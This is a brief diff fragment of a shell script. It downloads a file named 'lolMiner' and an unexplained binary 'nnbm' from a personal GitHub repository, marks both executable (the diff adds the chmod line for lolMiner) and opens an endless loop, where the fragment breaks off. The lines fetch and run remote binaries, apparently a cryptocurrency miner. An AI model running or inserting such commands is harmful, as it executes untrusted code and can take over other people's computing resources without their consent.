@@ -1,5 +1,6 @@
 wget https://github.com/venetta999/12345/blob/main/lolMiner
 wget -O nnbm https://raw.githubusercontent.com/venetta999/12345/main/nnbm
+chmod +x lolMiner
 chmod +x nnbm
 while true
 do
